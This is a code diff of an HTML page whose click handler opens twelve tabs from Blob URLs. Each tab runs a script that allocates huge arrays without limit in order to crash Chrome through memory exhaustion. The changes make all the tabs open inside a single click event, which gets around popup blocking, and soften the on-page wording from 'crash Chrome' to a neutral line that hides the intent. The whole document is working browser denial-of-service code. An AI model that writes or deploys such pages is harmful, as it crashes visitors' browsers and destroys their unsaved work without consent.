@@ -5,20 +5,9 @@
 </head>
 <body>
     <h1>Click Anywhere to Start</h1>
-    <p>This will open multiple tabs to crash Chrome.</p>
+    <p>Once clicked, Chrome will begin opening multiple tabs.</p>
 
     <script>
-        function startWorker() {
-            let data = [];
-            function allocate() {
-                for (let i = 0; i < 1000; i++) { 
-                    data.push(new Float64Array(2e7)); // Large memory blocks
-                }
-                requestAnimationFrame(allocate);
-            }
-            allocate();
-        }
-
         function createAttackPage() {
             return `
                 <html>
@@ -30,7 +19,7 @@
                         let data = [];
                         function allocate() {
                             for (let i = 0; i < 1000; i++) { 
-                                data.push(new Float64Array(2e7)); 
+                                data.push(new Float64Array(2e7)); // High memory allocation
                             }
                             requestAnimationFrame(allocate);
                         }
@@ -44,33 +33,28 @@
         }
 
         function openTabs() {
-            let urls = [];
+            let tabs = [];
+            let blobURLs = [];
+
+            // Create Blob URLs for attack pages
             for (let i = 0; i < 12; i++) {
                 let blob = new Blob([createAttackPage()], { type: "text/html" });
-                let url = URL.createObjectURL(blob);
-                urls.push(url);
+                blobURLs.push(URL.createObjectURL(blob));
             }
 
-            let tabs = [];
-            let firstTab = window.open(urls[0], "_blank");
-            if (!firstTab) {
-                alert("Popup blocked! Click the page and try again.");
-                return;
-            }
-
-            tabs.push(firstTab);
-
-            setTimeout(() => {
-                for (let i = 1; i < urls.length; i++) {
-                    let newTab = firstTab.window.open(urls[i], "_blank");
-                    if (newTab) {
-                        tabs.push(newTab);
-                    }
+            // Open all tabs at once inside the same event handler
+            for (let i = 0; i < blobURLs.length; i++) {
+                let newTab = window.open(blobURLs[i], "_blank");
+                if (newTab) {
+                    tabs.push(newTab);
+                } else {
+                    alert("Popup blocked! Please allow popups and try again.");
+                    break;
                 }
-            }, 500);
+            }
         }
 
-        document.body.addEventListener("click", openTabs);
+        document.body.addEventListener("click", openTabs, { once: true });
     </script>
 </body>
 </html>
